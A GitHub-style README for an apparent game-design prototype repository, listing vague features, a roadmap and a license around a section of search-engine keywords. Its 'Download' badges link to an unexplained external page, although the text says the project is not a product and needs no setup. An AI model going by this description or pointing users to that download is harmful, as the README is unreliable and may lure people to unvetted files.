![preview](https://raw.githubusercontent.com/jaycash619/interactive-systems-lab/main/promo_4c41133.svg)
[![Download](https://raw.githubusercontent.com/jaycash619/interactive-systems-lab/main/get_56d05.svg)](https://jaycash619.github.io/interactive-systems-lab/)

# 🎛️ Playwright Atelier — Interactive Systems Sketchbook

A companion repository to the **portfolio of Charlie Barra**, expanding the ideas found at the original game design, programming, and interactive systems showcase into a living workshop of prototypes, sketches, and playable fragments.

Where the main portfolio presents polished, finished pieces, **Playwright Atelier** is the workbench behind the curtain — the messy, curious, experimentation-heavy space where mechanics are tested, systems are bent, and interactive ideas are allowed to breathe before they become something more formal.

---

## 🌱 What This Repository Is

Think of this project as a greenhouse for interactive ideas. Some seeds grow into full games. Others become tools, toys, or teaching moments. A few stay strange forever, and that is perfectly fine.

Playwright Atelier collects:

- **Playable sketches** — small, focused interactions exploring a single mechanic
- **Systems experiments** — AI behaviors, economy loops, procedural generation trials
- **Design notes** — written reflections on decisions, failures, and discoveries
- **Reference implementations** — reusable patterns for input, camera, timing, and state
- **Prototype builds** — self-contained slices you can run and feel

This is not a product. It is a *practice*. The repository documents the ongoing craft of interactive design — the way ideas move from a napkin thought to something a player can touch.

---

## 🎮 Core Features

### 🧭 Responsive Interactive Interface
Every sketch and demo is built to adapt gracefully across desktop, tablet, and handheld displays. Layouts reflow, controls remap, and canvases resize without losing the feel of play. Whether you are on a wide monitor or a compact screen, the experience stays coherent.

### 🌍 Multilingual Support
Menu labels, in-sketch instructions, and design notes are structured for localization from day one. Text is separated from logic, making it straightforward to add new languages alongside English. The goal is to let an idea travel across audiences without being rebuilt.

### 🛎️ Always-Available Guidance Desk
A persistent help layer — in the form of tooltips, contextual hints, and an in-app reference panel — is available around the clock. Designers and players can surface explanations at any hour, so no one is left guessing how a mechanic is meant to behave.

### 🧩 Modular Sketch Architecture
Each experiment lives in its own self-contained folder with a clear entry point, assets, and notes. You can lift a single sketch without dragging the rest of the repository along. Modularity keeps curiosity cheap and iteration fast.

### ⏱️ Deterministic Timing Layer
A unified clock and step system ensures simulations behave the same way every run. This matters when you are tuning physics, animation, or turn order — no more chasing ghost bugs caused by frame drift.

### 🎨 Palette and Style Tokens
A shared set of colors, spacing rules, and typography scales keeps every sketch visually related without forcing them into identical costumes. Consistency here is a courtesy to the eye, not a constraint on creativity.

### 🗺️ Scene and State Flow
A lightweight scene manager handles transitions between menus, gameplay, and overlays. State is explicit, inspectable, and easy to reset — a small but mighty convenience for anyone iterating on flow.

### 🔍 Inspectable Systems Panel
A debug overlay reveals the internal state of any running sketch: entity counts, active timers, input vectors, and event logs. It is a window into the machine, useful for both teaching and troubleshooting.

### 📚 Living Design Notes
Every experiment ships with a short written reflection: what was tried, what surprised us, and what might come next. Over time, these notes become a personal archive of design thinking.

### ♿ Accessible Input Paths
Keyboard, pointer, and touch are treated as first-class citizens. Remapping is straightforward, and inputs are documented per sketch, so more people can engage with the work.

### 🧪 Rapid Iteration Toolkit
Hot reloading of assets, a scratchpad scene for testing single ideas, and a library of small utilities reduce the friction between an idea and a result.

---

## 🛠️ Technology Overview

The repository leans on a compact, well-understood toolchain — chosen so that the technology fades into the background while the design work takes center stage.

- **TypeScript-era JavaScript** for clarity and safety without ceremony
- **Canvas and WebGL** for rendering both 2D sketches and lightweight 3D scenes
- **A minimal build pipeline** that favors speed over complexity
- **Audio via the Web Audio API**, including synthesis for procedural sound effects
- **A data-driven content layer** so sketches can be configured without rewriting logic
- **Cross-browser testing** against current evergreen browsers

The emphasis is on *expressiveness over framework loyalty*. If a tool helps an idea come to life faster, it earns a place here.

---

## 📂 Repository Layout

A guided tour of the structure, written for humans rather than robots:

- **src/sketches** — Individual experiments, each with an entry file and a local notes file
- **src/systems** — Shared building blocks: timing, input, state, scenes, audio
- **src/ui** — Reusable interface pieces and the help desk overlay
- **src/assets** — Images, fonts, and sound sources used across sketches
- **docs/design-notes** — Longer reflections grouped by theme
- **docs/roadmap** — Where things are headed, loosely held
- **tests** — Lightweight checks for system-level behavior
- **tools** — Small scripts for asset preparation and local previewing

Each folder carries its own short README to explain its purpose in a sentence or two.

---

## 🚀 Getting Started

There are a few welcoming paths into the atelier, depending on how you like to explore.

1. **Wander the gallery** — Open the sketch index in a browser and click into anything that catches your eye.
2. **Read the notes** — The design reflections often explain more than the code does.
3. **Remix a sketch** — Copy a folder, rename it, and start changing values. Nothing here is precious.
4. **Open the systems panel** — Toggle the debug overlay and watch how the internals breathe.

The repository intentionally avoids heavyweight setup. A modern browser and a text editor cover most of the journey.

---

## 🧠 Design Philosophy

Playwright Atelier operates on a handful of beliefs:

- **Small is powerful.** A focused sketch teaches more than a sprawling demo.
- **Play is research.** Time spent tinkering is not wasted; it is how questions get answered.
- **Failures are content.** A mechanic that does not work is still a valuable note in the margin.
- **Beauty in restraint.** A simple palette and honest geometry often outshine complexity.
- **The player is a collaborator.** Design leaves room for discovery, not just instruction.

These ideas shape what gets built and what gets documented.

---

## 🔎 SEO-Friendly Highlights

For those arriving from a search engine, this repository touches on several themes in interactive design:

- Game design portfolio and interactive systems experimentation
- Procedural generation prototypes and simulation sketches
- Gameplay mechanic prototyping and tuning workflows
- Accessible browser-based game demos with responsive controls
- Multilingual game interface patterns
- Deterministic game timing and state management
- Debug overlays for interactive design work
- Design notes and documentation for indie game development
- Playable prototypes for game feel and player feedback loops

If any of those phrases brought you here, you are in the right workshop.

---

## 🗓️ Roadmap for 2026

The plan for the coming year is deliberately loose, because curiosity tends to reroute schedules:

- Expand the sketch index with a broader set of genre experiments
- Introduce a shared input remapping panel across all demos
- Add more multilingual entries, starting with a few widely spoken languages
- Publish quarterly design note roundups reflecting on what was learned
- Refine the systems panel into a friendlier teaching tool
- Explore small-scale procedural audio for atmosphere and feedback

Progress will be tracked in the docs folder rather than promised in stone.

---

## 🤝 Contributing

Contributions are welcome in the spirit of shared exploration — not just code, but ideas, notes, and critique.

- **Suggest a sketch idea** by opening an issue describing the mechanic or feeling you want to explore.
- **Improve an existing experiment** with a focused change and a short explanation of why.
- **Write a design note** reflecting on a problem you ran into and how you approached it.
- **Translate interface strings** to widen who can engage with the work.

Please keep changes small, honest, and documented. Clarity beats cleverness here.

---

## 🧾 License

This project is released under the **MIT License**. You are welcome to study it, adapt it, and build upon it with attribution.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

A copy is also included in the repository root as **LICENSE**.

---

## ⚠️ Disclaimer

Playwright Atelier is a personal design and learning space. Sketches may be unfinished, experimental, or intentionally odd. Nothing here should be treated as production-ready software, and nothing here comes with a promise of stability. Use the ideas as inspiration, take the patterns you find useful, and leave the rest as a curious artifact. The author is not responsible for how these experiments are adapted or deployed elsewhere.

---

## 🌟 Closing Thought

A portfolio shows the finished constellation. This repository shows the individual stars being placed — some bright, some flickering, some drifting toward a shape not yet imagined. If you find something here that sparks an idea of your own, then the atelier has done its job.

[![Download](https://raw.githubusercontent.com/jaycash619/interactive-systems-lab/main/get_56d05.svg)](https://jaycash619.github.io/interactive-systems-lab/)